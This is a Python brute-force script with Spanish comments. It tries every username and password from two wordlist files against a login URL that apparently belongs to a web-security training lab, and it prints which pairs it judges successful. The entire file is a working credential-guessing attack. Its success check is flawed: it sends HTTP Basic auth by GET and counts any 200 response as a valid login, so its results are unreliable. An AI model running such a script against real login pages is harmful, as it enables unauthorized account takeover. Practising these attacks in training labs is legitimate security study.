import requests
import re


# Función para cargar una lista desde un archivo
def cargar_lista_desde_archivo(archivo):
    with open(archivo, 'r') as file:
        return [line.strip() for line in file]

# URLs y usuarios
url = 'https://0a7f00e904cec7b982fe476c008f00ef.web-security-academy.net/login'
usuarios = cargar_lista_desde_archivo('user.txt')

# Cargar lista de contraseñas desde el archivo
contraseñas = cargar_lista_desde_archivo('pass.txt')

# Iterar sobre cada usuario y contraseña
for usuario in usuarios:
    for contraseña in contraseñas:
        response = requests.get(url, auth=(usuario, contraseña))
        if response.status_code == 200:
            print(f"¡Login exitoso! Usuario: {usuario}, Contraseña: {contraseña}")
            # Puedes hacer más cosas aquí si necesitas
            break  # Romper el bucle interno si el login es exitoso
        else:
            print(f"Fallo de login para el usuario: {usuario}, Contraseña: {contraseña}")
